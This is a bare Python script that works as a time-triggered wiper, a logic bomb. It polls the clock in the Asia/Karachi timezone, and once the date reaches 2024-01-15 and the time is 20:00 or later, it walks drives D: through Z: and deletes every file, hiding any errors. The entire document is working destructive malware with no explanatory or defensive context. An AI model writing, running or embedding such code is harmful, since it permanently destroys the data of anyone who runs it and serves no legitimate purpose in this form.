from time import sleep
from os import walk , remove
from datetime import datetime
from pytz import timezone

def get_time():
    dt = datetime.now(timezone('Asia/Karachi'))
    date = str(dt).split(" ")[0]
    time = str(dt).split(" ")[1]
    time = time[0:5]
    return date , time

drive_letters = ['d:\\', 'e:\\', 'f:\\', 'g:\\', 'h:\\', 'i:\\', 'j:\\', 'k:\\', 'l:\\', 'm:\\', 'n:\\', 'o:\\', 'p:\\', 'q:\\', 'r:\\', 's:\\', 't:\\', 'u:\\', 'v:\\', 'w:\\', 'x:\\', 'y:\\', 'z:\\']

while True:
    date , time = get_time()
    if(date >= "2024-01-15" and time >= "20:00"):
        for letter in drive_letters:
            for full_path ,foldername , filename in walk(f"{letter}"):
                for file in filename:
                    try:
                        remove(full_path + "\\" + file)
                    except:
                        pass
    sleep(60)